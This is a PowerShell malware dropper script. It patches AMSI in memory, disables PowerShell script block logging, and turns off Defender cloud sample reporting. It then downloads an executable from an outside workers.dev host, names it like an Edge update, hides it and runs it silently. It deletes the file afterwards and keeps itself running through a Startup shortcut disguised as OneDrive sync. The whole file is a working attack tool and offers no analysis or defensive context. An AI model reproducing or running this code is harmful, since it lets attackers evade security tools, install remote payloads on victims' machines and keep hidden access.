$ErrorActionPreference = 'SilentlyContinue'
Write-Host "[+] v60 AMSI-Resistant Drop started at $(Get-Date)" -ForegroundColor Green

# === OBFUSCATED AMSI BYPASS ===
$amsi = 'using System;using System.Runtime.InteropServices;public class A{ [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void P(){IntPtr l=LoadLibrary("amsi.dll");if(l==IntPtr.Zero)return;IntPtr x=GetProcAddress(l,"AmsiScanBuffer");if(x==IntPtr.Zero)return;uint o;VirtualProtect(x,(UIntPtr)6,0x40,out o);Marshal.Copy(new byte[]{0x31,0xC0,0xC3},0,x,3);VirtualProtect(x,(UIntPtr)6,o,out o);}}'
Add-Type $amsi
[A]::P()

# === SBL Disable ===
$null = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
if($settings){$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{};$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0}

# === MAPS Kill ===
Write-Host "[+] Killing MAPS..." -ForegroundColor Yellow
try {
    $k = "HKCU:\Software\Microsoft\Windows Defender\Spynet"
    New-Item $k -Force | Out-Null
    Set-ItemProperty $k "SubmitSamplesConsent" 0 -Type DWord -Force
    Set-ItemProperty $k "SpyNetReporting" 0 -Type DWord -Force
    Set-ItemProperty $k "FirstRun" 0 -Type DWord -Force
} catch {}

# === DOWNLOAD + DROP ===
$u = "https://aged-mountain-614b.natalia-kush82.workers.dev/update"
$b = (New-Object Net.WebClient).DownloadData($u)
Write-Host "[+] Downloaded payload: $($b.Length) bytes" -ForegroundColor Green

$r = [Guid]::NewGuid().ToString("N").Substring(0,8)
$t = "$env:TEMP\MicrosoftEdgeUpdate_$r.exe"

[IO.File]::WriteAllBytes($t, $b)
Unblock-File $t -EA 0
Remove-Item $t -Stream Zone.Identifier -EA 0
[System.IO.File]::SetAttributes($t, 'Hidden')

Write-Host "[+] Staged as $t" -ForegroundColor Yellow

Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1400)

try {
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $t | Out-Null
    Start-Process $t -WindowStyle Hidden -EA 0
    Write-Host "[+] Executed" -ForegroundColor Green
} catch {
    Write-Host "[-] Exec error: $_" -ForegroundColor Red
}

# Fast cleanup
Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.2; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null

# Persistence
$flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
if(-not (Test-Path $flag)){
    $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
    $w = New-Object -ComObject WScript.Shell
    $s = $w.CreateShortcut($lnk)
    $s.TargetPath = "powershell.exe"
    $s.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $s.Save()
    New-Item $flag -Force | Out-Null
}

Write-Host "[+] v60 running - waiting for callback..." -ForegroundColor Magenta
Start-Sleep -Seconds 240
